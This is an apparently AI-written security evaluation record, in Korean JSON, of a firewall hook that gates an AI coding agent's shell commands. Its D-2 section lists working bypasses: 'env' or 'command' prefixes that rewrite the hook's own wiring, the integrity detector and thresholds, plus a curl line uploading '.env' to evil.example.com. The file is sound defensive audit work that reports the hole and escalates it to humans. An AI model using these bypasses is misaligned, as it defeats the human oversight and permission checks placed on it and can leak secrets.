@@ -1,0 +1,209 @@
+{
+  "timestamp": "2026-08-03T07:56:47+0900",
+  "sprint": 53,
+  "iteration": 7,
+  "_judgment_role": "F37 critical 2차",
+  "_first_judgment": "progress/agent-comms/evaluator-feedback-2026-08-02T23-42-04+0900.json",
+  "features_evaluated": [
+    "F67"
+  ],
+  "security_tier": "critical",
+  "head": "08ed589",
+  "branch": "main",
+  "agrees_with_first": false,
+  "_judgment_character": "1차의 구현 주장은 전부 독립적으로 재현됐다 — 철회는 F67의 차분 안에서 완전하다. 갈리는 지점은 하나다: 1차의 'main 대조'가 이미 F67을 포함한 베이스라인에 대해 수행됐고, 올바른 베이스라인으로 다시 재면 예측 계층 전체를 건너뛰는 살아 있는 우회(`env`/`command` 접두사)가 드러난다. 그 우회는 F67의 차분이 만든 것이 아니지만, F67이 다시 쓴 INV-14의 손실 상한 서술이 그것을 빠뜨린다 — 손실을 실제보다 **좁게** 적는 방향이며, 이 스프린트가 다섯 번 반려된 바로 그 축이다.",
+  "scores": {
+    "functionality": 8,
+    "code_quality": 6,
+    "security": 6,
+    "error_handling": 7,
+    "test_coverage": 6
+  },
+  "score": 6,
+  "score_method": "min_of_5",
+  "pass_threshold": 7,
+  "security_threshold_critical": 7,
+  "verdict": "fail",
+  "fail_reasons": [
+    "security 6 < 7 (critical tier) — SC-3 미충족: INV-14가 서술하는 손실 상한이 배포된 훅을 서술하지 않는다",
+    "score 6 < pass_threshold 7 (min-of-5)"
+  ],
+  "escalation": {
+    "required": true,
+    "reason": "F37 critical 2차 판정이 1차(pass)와 불일치한다 — 자동 pass 금지, 사람 판단 필요",
+    "action_taken": "progress/feature_list.json 을 건드리지 않았다. F67 은 passes:true 로 남아 있으며, 되돌릴지 여부는 사람이 결정한다.",
+    "recommended_disposition": "F67 의 구현을 되돌릴 이유는 없다(차분은 깨끗하다). 필요한 것은 아래 4건의 후속 수정이며, 그중 첫 번째는 별도 critical 티켓으로 즉시 처리할 것을 권고한다."
+  },
+  "confirmed_from_first_judgment": [
+    "AC-1b(열거된 형태): 인터프리터 × 하네스 경로 420 케이스가 **전부 ask**. 설치본(`.claude/hooks/*.sh`·`.claude/plugins/cc-harness/hooks/*.sh`) · 미추적 신규(`hooks/newfile.sh`·`tests/newfile.bats`) · 접미사 7종(`.bak`·`.orig`·`~`·`,v`·`%`·`.swp`·`.tmp`) · 대소문자 4종 · 저장소 밖 5종 · 따옴표 유무 · `cd`/`pushd`/`os.chdir`/서브셸 우회. allow 0건.",
+    "AC-4: 쓰기 신호 arm(리다이렉트·cp·mv·tee·dd·`sed -i`) 데이터 플레인 전부 ask — 직접 실행 확인.",
+    "AC-5: 편집 전용 도구(vim) 데이터 플레인 전부 ask — 직접 실행 확인.",
+    "AC-6(올바른 베이스라인으로): `d5a4036^`(F67 첫 커밋 직전) vs HEAD, 자체 구성 1101 케이스 × 배선/미배선 2조건 → **fail-open 0건**, 방향 무관 기타 차이 0건. 차이 29건은 전부 더 엄격한 방향.",
+    "AC-8: `bats tests/` 1회 실행 — plan 1..724, ok 724, not ok 0, skip 1(v1.4.0 플러그인 캐시 부재, F67 무관). behavioral 프로브 후보 0건(`[]`).",
+    "AC-9: 면제 결과 집합 = 1(sed/awk 데이터 플레인 arm), main 과 같은 arm.",
+    "AC-10: heredoc 3형태 × 컨트롤 플레인 3경로 = 9 케이스 전부 ask — 직접 실행 확인.",
+    "SC-1: ASK arm 45(v1.38.0) → 56(HEAD), add-only 유지.",
+    "SC-2: `EXEMPTABLE_ARM_TOKENS` 항목 1개(`READ_CAPABLE_ARM`), 판정은 `arm_is_exemptable()` 한 곳.",
+    "은퇴 코드: `exempt_paths_are_detected()`·`DETECTED_LOCATIONS` 의 판정 경로 호출부 0건. 훅 안의 유일한 비주석 참조는 함수 자기 몸통(:269)뿐이며, 되살리려면 판정줄에 `&& exempt_paths_are_detected` 를 의도적으로 다시 붙여야 한다. 테스트가 그 은퇴 상태를 고정한다.",
+    "F65 sed/awk 면제 생존: `sed -n '1,5p' hooks/lib.sh > /tmp/out` 이 배선 시 allow · 미배선 시 ask — 배선이 판정을 뒤집는다(HEAD·베이스라인 동일).",
+    "**M1 변이 실측(1차의 미검증 판단을 검증)**: 격리 클론에서 `EXEMPTABLE_ARM_TOKENS` 에 `INTERPRETER_ARM` 재추가 → 인터프리터 쓰기(`hooks/lib.sh`·`harness-config.json`·`tests/*.bats`)가 실제로 allow 로 되살아나고, `tests/pre-bash-firewall.bats` 221 케이스 중 **9건이 빨개진다**. 1차의 '다른 9개가 잡으므로 게이트는 열려 있지 않다'는 판단은 정확하다 — 개수까지 일치."
+  ],
+  "divergence_from_first_judgment": [
+    {
+      "id": "D-1",
+      "severity": "high",
+      "confidence": "high",
+      "title": "1차의 'main 대조' 베이스라인이 이미 F67 을 포함하고 있었다 — 차분이 측정한 것은 마지막 두 커밋뿐이다",
+      "measured": "`v1.38.0`(=7874866, F65 머지)의 훅에는 `pure_read_only()` 도 `EXEMPTABLE_ARM_TOKENS` 도 **없다**(18485 bytes). 반면 F67 브랜치가 갈라져 나온 `6fda20a` 의 훅에는 **둘 다 있다**(27005 bytes). v1.38.0..6fda20a 사이에서 훅을 건드린 커밋 7개 중 `2d3a39e`·`d5a4036`·`d183712`·`70966db`·`dd40891` 이 F67/핫픽스 작업이다. 즉 F67 은 회전마다 main 으로 들어갔고, 7차 판정 시점의 로컬 `main` 은 pre-F67 main 이 아니었다.",
+      "why_it_matters": "1차가 보고한 '706 케이스 차분 fail-open 0건'은 그 좁은 베이스라인에 대해서는 참이지만, AC-1b/AC-6 이 문장으로 주장하는 것('그 판정이 main 과 동일하다')을 뒷받침하지 못한다. 같은 문제가 테스트에도 있다 — main 대조 테스트가 **움직이는 로컬 ref** 를 기준으로 삼는다(D-3 참조).",
+      "resolution": "올바른 베이스라인(`d5a4036^`)으로 내가 다시 측정했고, **그 결과는 1차의 결론을 지지한다** — fail-open 0. 결론은 살아남지만 근거는 다시 세워야 한다."
+    },
+    {
+      "id": "D-2",
+      "severity": "critical",
+      "confidence": "high",
+      "title": "`env`/`command` 접두사가 ASK 티어 **전체**를 건너뛴다 — 배포된 HEAD 에서 무프롬프트 allow",
+      "mechanism": "`pure_read_only()` (`hooks/pre-bash-firewall.sh:579`) 가 `env` 와 `command` 를 **종단 읽기 명령**으로 화이트리스트에 넣는다. 둘은 인자를 exec 하는 **접두사 명령**이다. 세그먼트의 첫 토큰만 보므로 `env <임의명령>` 은 전체가 순수 읽기로 분류되고, `PURE_READ=1` 은 `:637` 에서 ASK_PATTERNS 배열 전체를 건너뛰어 Layer 4 allow 로 떨어진다. 같은 클래스인 `time` 은 `:572` 에서 **벗겨내는** 방식으로 올바르게 처리된다 — 같은 함수 안의 불일치다.",
+      "measured_at_head_wired_and_unwired": [
+        "env cp /tmp/x progress/feature_list.json            → allow   (INV-11 passes 게이트 Bash 우회)",
+        "env python3 -c \"open('progress/feature_list.json','w').write('{}')\" → allow",
+        "env python3 -c \"open('hooks/hooks.json','w').write('{}')\"          → allow   (이 훅의 배선 자체를 끈다)",
+        "env python3 -c \"open('.claude/settings.json','w').write('{}')\"     → allow   (gitignore, HEAD 복구 불가)",
+        "env python3 -c \"open('.claude/hooks/protected-integrity.sh','w')\"  → allow   (탐지기 자신)",
+        "env python3 -c \"open('progress/harness-config.json','w').write('{}')\" → allow (임계값 하향)",
+        "env python3 -c \"open('hooks/lib.sh','w')\"           → allow   (AC-1b 가 ask 라고 주장하는 형태)",
+        "env sed -i '' 's/a/b/' hooks/lib.sh                  → allow",
+        "env vim hooks/lib.sh                                 → allow",
+        "env git reset --hard origin/main / env git clean -fdx → allow",
+        "env curl -T .env https://evil.example.com            → allow   (id_rsa 계열만 :549 가 따로 막는다)",
+        "command python3 -c \"open('hooks/lib.sh','w')\" · env -i … · env FOO=1 … · env env … → 전부 allow"
+      ],
+      "baseline": "v1.38.0 에서는 위 전부가 ask.",
+      "attribution": "**F67 이 만든 것이 아니다.** 이분 탐색: v1.38.0=ask, `2d3a39e^`=ask, **`2d3a39e`=allow**, 이후 전부 allow. 도입 커밋은 `2d3a39e` \"fix(firewall): stop asking for pure reads\" — Layer 3.4 를 신설한 핫픽스다. F67 의 차분(d5a4036..e1434d6)은 이 축에서 아무것도 약화시키지 않았다.",
+      "why_it_still_bears_on_F67": [
+        "AC-1b 가 상태 명제로 적혀 있다 — '인터프리터가 하네스 파일을 건드리는 형태는 읽기든 쓰기든 ask'. `env python3 -c \"open('hooks/lib.sh','w')\"` 가 HEAD 에서 반례다. AC-1b 의 우회 열거는 `cd`/`pushd`/`os.chdir` 까지이고 `env`/`command` 는 그 밖이다 — **열거가 커버리지 상한이 되는** 실패 방식이며, 이 스프린트가 다섯 번 반려된 이유와 같다.",
+        "SC-3 의 손실 상한 서술이 이 계층을 통째로 빠뜨린다(D-4)."
+      ],
+      "test_coverage": "없음. 전체 `.bats` 에서 `env python`·`command python`·`env cp` 발생 0건. `pure_read_only`·`PURE_READ` 를 직접 참조하는 테스트 0건."
+    },
+    {
+      "id": "D-3",
+      "severity": "medium",
+      "confidence": "high",
+      "title": "`arm_is_exemptable()` 의 배제 목록이 읽기 형태에 대해서는 한 층 위에서 무력화된다",
+      "measured": "`:183-196` 이 '절대 면제하지 않는다'고 적은 경로들이 Layer 3.4 에서 먼저 allow 된다 — `sed -n '1,5p' .claude/settings.json` · `awk 'NR<3' hooks/hooks.json` · `cat .claude/hooks/protected-integrity.sh` · `grep -n x .claude/hooks/protected-integrity.sh` · `sed -n '1,5p' templates/progress/feature_list.json` 전부 allow (v1.38.0 은 ask).",
+      "assessment": "순수 읽기이므로 훼손 위험은 없고 보안 영향은 낮다. 문제는 코드가 그 배제를 **모든 명령에 대해 load-bearing 인 것처럼** 논증한다는 것이다 — 실제로는 쓰기 형태에만 걸린다. 방어를 잘못된 층에 적어 둔 것이다.",
+      "attribution": "D-2 와 같은 커밋(`2d3a39e`)."
+    },
+    {
+      "id": "D-4",
+      "severity": "high",
+      "confidence": "high",
+      "title": "SC-3 미충족 — INV-14 의 손실 상한이 배포된 훅을 서술하지 않으며, 방향이 **좁게** 적는 쪽이다",
+      "measured": [
+        "INV-14 `:466-472` — '면제 대상 토큰은 EXEMPTABLE_ARM_TOKENS 한 곳에 열거된다 — 현재 항목은 읽기 가능 도구(sed·awk·mawk) 하나뿐'. 실제로는 Layer 3.4 가 그 앞에서 약 26개 명령 이름(`cat`·`head`·`grep`·`jq`·`cut`·`diff`·`env`·`command`·`cd`·`bats` …)을 통째로 면제한다.",
+        "INV-14 `:553-555` — '배선이 없으면 예측이 되살아난다(fail-safe)'. Layer 3.4 는 배선을 **보지 않는다**. 미배선 조건 실측: pre-hotfix main 이 게이트하던 112 케이스가 HEAD 에서 allow.",
+        "INV-14 전체에서 `pure_read_only`·`Layer 3.4` 언급 0건 (유일한 '순수 읽기' 출현 `:507` 은 철회 이전 문단의 다른 얘기다).",
+        "INV-14 `:510` — '그 대가로 …변조·소비 창이 sed·awk 뿐 아니라 python3 -c 로도 열린다' — 철회 이전 서술이 그대로 남아 있다(1차 지적 재확인)."
+      ],
+      "why_this_is_the_deciding_issue": "INV-14 스스로 `:479` 에 적었다 — '부분적으로만 닫힌 경로 검사는 손실 상한을 실제보다 **좁게** 읽히게 만들어 아예 없는 것보다 나쁘다.' F67 은 그 문장을 근거로 면제를 철회했고, 같은 회전에서 INV-14 를 55줄 다시 썼다. 그렇게 다시 쓴 손실 상한이 살아 있는 통짜 우회를 빠뜨린다. 1차는 잔존 산문 3건을 '방향이 보수적(실제보다 넓게 선언)이라 보안 영향 없음'으로 판단했는데, 그 판단은 세 산문 자리에 대해서는 맞다. 내가 찾은 것은 **반대 방향의 누락**이고, 실행 가능한 우회가 뒷받침한다."
+    }
+  ],
+  "reproduced_open_items_from_first_judgment": [
+    {
+      "item": "(i) AC-9 전용 테스트가 면제 복원 변이를 통과시킨다",
+      "status": "재현됨",
+      "evidence": "격리 클론에 M1 적용 후 `bats tests/pre-bash-firewall.bats` → 9건 빨강. 그 9건에 \"the exemption result set is pinned, not just the token list\" 는 **없다**(초록 유지). 1차의 진단·처방 모두 정확하다."
+    },
+    {
+      "item": "(ii) main 대조 테스트 2개가 로컬 main ref 부재 시 조용히 skip",
+      "status": "재현됨",
+      "evidence": "HEAD 를 detached 로 클론 → `git branch -D main` + `git remote remove origin` (실측: main ABSENT, origin/main ABSENT) → `bats -f F67` 이 plan 1..28, ok 28, **skip 2** 로 초록을 보고한다. skip 된 것은 \"the decision function matches main outside the intended change\" 와 \"the cwd-detour class is identical to main\" — AC-6/AC-1b 를 고정하는 바로 그 둘이다. D-1(움직이는 베이스라인)과 합치면, main 대조 계열 기준은 **없거나 오염된 기준점**에 매여 있다."
+    },
+    {
+      "item": "(iii) 철회 이전 산문 3곳",
+      "status": "재현됨 — 전부 잔존",
+      "evidence": "`hooks/pre-bash-firewall.sh:204-206` ('아래 판정부는 경로를 보지 않고 **다섯 도구**(python·node·ruby·sed·awk 계열)를 무조건 면제한다'), `:659` ('그래서 **다섯 도구**…는 경로와 무관하게 면제하고'), `docs/INVARIANTS.md:510`. 셋 다 같은 파일의 권위 문단(`:163-169`·`:466-472`)과 정면으로 어긋난다. 방향은 보수적이므로 단독으로는 반려 사유가 아니다."
+    }
+  ],
+  "over_correction_check": {
+    "verdict": "과잉 교정 없음",
+    "f65_exemption_alive": "확인 — 배선 유무로 판정이 뒤집힌다.",
+    "new_asks_measured": "F67 차분(d5a4036^ → HEAD) 기준 새 게이트 29건 = `progress/.approval-queue.jsonl` 21건(F68 arm) + `progress/contracts/sprint-*.json` 7건(신규 계약 arm) + 중복 1. 방향은 전부 더 엄격하다.",
+    "dev_flow_not_blocked": "정상 개발 흐름 표본(`python3 -m pytest` · `npm test` · `git diff hooks/lib.sh` · `bats tests/…` · `cat hooks/lib.sh` · `jq '.features' progress/feature_list.json` · 계약/큐 읽기)에서 새로 막힌 것은 `python3 -c \"print(open('progress/.approval-queue.jsonl').read())\"` 하나뿐이며 이는 F68 의 의도된 게이트다.",
+    "note_f68_scope": "계약 arm 은 셸 형태 쓰기(리다이렉트·cp·mv·tee·vim·dd)만 잡는다 — `python3 -c \"open('progress/contracts/sprint-53.json','w')\"` · `node -e writeFileSync(…)` · `sed -i '' … contracts/…` 는 HEAD 에서 allow 다. F68 범위이므로 여기서는 관찰로만 남긴다(별도 9차 판정에 전달 권고)."
+  },
+  "passed_criteria": {
+    "acceptance": [
+      "AC-1b (열거된 형태 420/420 ask)",
+      "AC-4",
+      "AC-5",
+      "AC-6 (올바른 베이스라인 기준 fail-open 0)",
+      "AC-8",
+      "AC-9 (결과 집합 1)",
+      "AC-10"
+    ],
+    "security": [
+      "SC-1",
+      "SC-2",
+      "SC-5"
+    ],
+    "error_scenarios": [
+      "ES-1",
+      "ES-2",
+      "ES-3 (arm_is_exemptable 경로에 한해)"
+    ]
+  },
+  "failed_criteria": {
+    "acceptance": [
+      "AC-1b (상태 명제로서): `env`/`command` 접두사 인터프리터 쓰기가 하네스 파일에 대해 allow — 우회 열거 밖"
+    ],
+    "security": [
+      "SC-3: INV-14 의 손실 상한 서술이 Layer 3.4 를 빠뜨리고, fail-safe 를 성립하지 않는 범위까지 주장한다"
+    ],
+    "error_scenarios": []
+  },
+  "unverified_by_this_judgment": [
+    "AC-2 (격리 랩 탐지·복구 종단) — 1차가 실행했고 나는 재실행하지 않았다. 이 차원(error_handling)의 점수는 그만큼 보수적으로 두었다.",
+    "SC-4 (PROTECTED_GLOBS ≡ is_protected 및 M2·M3 변이) — 1차가 실행했고 나는 재실행하지 않았다."
+  ],
+  "issues": [
+    "[security][critical][confidence:high] `pure_read_only():579` 가 `env`·`command` 를 종단 읽기 명령으로 취급해 ASK 티어 전체가 건너뛰어진다. `env cp /tmp/x progress/feature_list.json`(INV-11 게이트) · `env python3 -c \"open('hooks/hooks.json','w')\"`(방화벽 배선) · `env git reset --hard` 가 무프롬프트 allow. 고칠 것: `time` 과 같은 방식으로 접두사를 **벗겨내고** 그 뒤 토큰을 재판정한다(`env` 의 `-i`/`-u`/`-C`/`VAR=` 인자 소비 포함). 도입 커밋 `2d3a39e`, F67 차분 밖.",
+    "[security][high][confidence:high] INV-14 가 Layer 3.4 를 서술하지 않는다 — 손실 상한이 실제보다 좁게 읽힌다(SC-3 미충족). 고칠 것: '어느 arm이 예측에서 빠졌나' 옆에 '어느 **명령 형태**가 예측 자체를 건너뛰는가' 절을 추가하고, `:553-555` 의 fail-safe 주장을 `arm_is_exemptable` 경로로 한정한다.",
+    "[test][medium][confidence:high] AC-9 전용 테스트가 M1 을 통과시킨다(1차 지적 재현). `EXEMPTABLE_ARM_TOKENS` 배열을 파싱해 그 토큰으로만 면제를 재현하고 기대값 1.",
+    "[test][medium][confidence:high] 로컬 `main` 부재 시 main 대조 테스트 2개가 조용히 skip 하고 스위트는 초록(1차 지적 재현). 더해서, 그 `main` 은 스프린트 중 F67 을 흡수하며 움직였다 — 대조 기준을 **고정 커밋/태그**(예: `v1.38.0` 또는 계약에 박은 SHA)로 바꾸고, ref 부재 시 skip 이 아니라 fail 로 처리할 것.",
+    "[test][medium][confidence:high] `pure_read_only`/`PURE_READ` 를 직접 겨냥한 테스트가 0건이며, 접두사 명령 형태(`env`·`command`·`nice`·`nohup`·`timeout`·`stdbuf`·`xargs`)를 다루는 케이스도 0건이다. ASK 배열 전체를 건너뛸 수 있는 유일한 스위치가 무커버리지다.",
+    "[code][medium][confidence:high] `arm_is_exemptable()` 의 배제 목록(`:183-196`)이 읽기 형태에 대해 Layer 3.4 에 선점당한다 — 코드는 그 배제를 모든 명령에 대해 유효한 것처럼 논증한다.",
+    "[code][low][confidence:high] 철회 이전 산문 3곳 잔존(`hooks/pre-bash-firewall.sh:204-206`·`:659`, `docs/INVARIANTS.md:510`) — '다섯 도구를 무조건 면제한다'가 `EXEMPTABLE_ARM_TOKENS` 정의부와 모순된다. 방향은 보수적.",
+    "[criteria][low][confidence:medium] 계약 arm(F68 범위)이 인터프리터 쓰기와 `sed -i` 를 잡지 않는다 — `python3 -c \"open('progress/contracts/sprint-53.json','w')\"` 가 allow. 9차 판정으로 전달 권고.",
+    "[process][medium][confidence:high] 회전마다 브랜치를 main 으로 흡수하면 '브랜치 vs main' 대조가 스스로를 무효화한다. critical 기능의 차분 검증은 **스프린트 시작 커밋을 계약에 고정**하고 그 SHA 로 수행할 것."
+  ],
+  "criteria_gaps": {
+    "missing_criteria": [
+      "Layer 3.4(`pure_read_only`)에 대한 acceptance/security criteria 가 어느 스프린트에도 없다 — ASK 티어 전체를 건너뛰는 스위치인데 계약에 등장하지 않는다. 접두사 명령·화이트리스트 결함에 대한 기준이 필요하다.",
+      "AC-1b 의 우회 열거가 `cd`/`pushd`/`os.chdir` 에서 멈춘다. `env`·`env -C`·`command`·`bash -c`·`xargs`·`find -exec` 를 포함하거나, 열거 대신 '접두사 명령은 벗겨내고 재판정한다'는 **성질**로 기준을 다시 쓸 것."
+    ],
+    "ambiguous_criteria": [
+      "AC-6/AC-1b 의 'main 과 동일하다' — 어느 main 인지 고정돼 있지 않다. 스프린트 중 main 이 움직이면 기준이 자기 자신을 참조하게 된다."
+    ],
+    "security_criteria_insufficient": [
+      "SC-3 이 '손실 상한을 적는다'를 네 항목의 열거로 조작적 정의해 두어, 열거 밖 메커니즘(Layer 3.4)이 빠져도 형식적으로는 충족처럼 보인다."
+    ],
+    "action_required": "다음 iteration 에서 (1) `pure_read_only` 접두사 처리 수정 + 회귀 테스트, (2) INV-14 에 Layer 3.4 절 추가 및 fail-safe 주장 한정, (3) AC-9 테스트 수정, (4) main 대조 기준점을 고정 SHA 로 전환하고 ref 부재 시 fail."
+  },
+  "evidence": {
+    "differential_corpus_construction": "자체 구성 코퍼스 1101 케이스 = 40 경로 × 26 도구 형태(=1040) + 특수 61(cd/pushd/서브셸/os.chdir/env -C/bash -c/sh -c/xargs/find -exec 우회, 따옴표 4종, heredoc 5종, 개행·세미콜론 쌍, 인용부호 중화 구분자, 도구명 변형 5종, 정상 개발 흐름 18종, egress·INV-11·deny 티어 7종). 경로에는 설치본 4종, 미추적 신규 2종, 접미사 7종, 대소문자 5종, 저장소 밖 5종, 템플릿 seed 2종, 컨트롤 플레인 3종 포함. 스크립트: /private/tmp/claude-501/-Users-hanbyeol-Project-studioj-cc-harness/86566820-59c1-40ea-9fea-c2f4028672c5/scratchpad/probe2nd.py",
+    "differential_vs_pre_F67_main": "베이스라인 `d5a4036^`(F67 첫 커밋 직전) vs HEAD `08ed589`, 배선 랩·미배선 랩 각각 1101 케이스: **diffs=29, FAIL-OPEN=0, new-gate=29, other=0** (양 조건 동일). 새 게이트 내역: approval-queue 21 / contracts 7 / 중복 1.",
+    "differential_vs_v1_38_0": "같은 코퍼스, 베이스라인 `v1.38.0`(F65 머지) vs HEAD: 배선 diffs=50(fail-open 21 / new-gate 29), 미배선 diffs=141(fail-open 112 / new-gate 29). fail-open 은 전부 Layer 3.4 계열이며 이분 탐색으로 `2d3a39e` 에 귀속됨 — F67 차분 밖.",
+    "attribution_bisect": "v1.38.0 / 2d3a39e^ / 2d3a39e / c2375d9 / ee05dbc / d5a4036 / 6fda20a / e1434d6 / 08ed589 에서 6개 대표 케이스 판정: 전부 `2d3a39e` 에서 ask→allow 로 전환. 스크립트: scratchpad/attrib.py, scratchpad/envprobe.py",
+    "baseline_contamination_proof": "`git show v1.38.0:hooks/pre-bash-firewall.sh` 에 `pure_read_only() {` 없음(18485 bytes) / `git show 6fda20a:…` 에 있음(27005 bytes). v1.38.0..6fda20a 사이 훅 커밋 7개 열거 확인.",
+    "mutation_M1": "격리 클론(`git clone --no-hardlinks` → `git checkout 08ed589`)에서 `EXEMPTABLE_ARM_TOKENS` 에 `INTERPRETER_ARM` 재추가. 변이 전 `bats -f F67` 28/28 초록. 변이 후 `bats tests/pre-bash-firewall.bats` = plan 1..221, ok 212, **not ok 9**. 실패 테스트 9개 이름 기록. AC-9 전용 테스트는 초록 유지. 변이 후 행위 확인: 인터프리터 쓰기 3형태가 allow 로 복귀. 스크립트: scratchpad/mutate.sh",
+    "skip_reproduction": "detached 클론에서 로컬 main·origin/main 제거 후 `bats -f F67 tests/pre-bash-firewall.bats` → plan 1..28, ok 28, skip 2, 종료 초록.",
+    "regression_full_suite": "`bats tests/` 1회 실행을 파이프 없이 파일로 리다이렉트해 계수 — plan `1..724`, `^ok` 724, `^not ok` 0, `# skip` 1(v1.4.0 플러그인 캐시 부재, F67 무관). 저장소 워킹트리는 실행 전후 clean.",
+    "behavioral_probe": "`bash scripts/probes/behavioral.sh` → `[]` (후보 0건), exit 0.",
+    "retired_code": "저장소 전역 grep — `hooks/pre-bash-firewall.sh` 안의 비주석 참조는 정의부(227·235)와 함수 몸통(269)뿐. 판정 경로 호출부 0. 나머지 참조는 테스트(정의를 eval 해 직접 호출하는 고정 테스트)·문서·lessons.",
+    "criteria_direct_checks": "AC-10 9케이스 · AC-5 4케이스 · AC-4 6케이스를 HEAD 훅에 직접 주입해 전부 ask 확인. SC-1 arm 계수 45→56.",
+    "labs": "배선 랩 = `.claude/hooks/protected-integrity.sh`(비어있지 않음) + PostToolUse:Bash 배선된 `.claude/settings.json` + git 초기화·커밋. 미배선 랩 = 같은 트리에서 탐지기·설정 제거, `CLAUDE_PLUGIN_ROOT` 미설정. 배선 판별 sanity: `sed -n '1,5p' hooks/lib.sh > /tmp/out` 이 배선 allow / 미배선 ask (HEAD·베이스라인 모두)."
+  },
+  "_note_to_human": "1차 판정을 되돌릴 것을 권하지 않는다. F67 의 구현은 내가 재현한 모든 축에서 건전하다 — 철회는 완전하고, 차분에 fail-open 이 없으며, 변이가 테스트로 잡힌다. 내가 pass 에 동의하지 못하는 이유는 단 하나다: critical 티어의 보안 점수는 **배포된 상태**에 대한 진술이어야 하는데, 그 상태에는 `env` 한 단어로 방화벽 ASK 티어 전체를 우회하는 경로가 살아 있고, F67 이 다시 쓴 INV-14 는 그것을 서술하지 않는다. 우회를 막고(한 함수의 접두사 처리) INV-14 에 그 계층을 적으면 보안 점수는 8 로 올라가고 나도 pass 에 동의한다."
+}
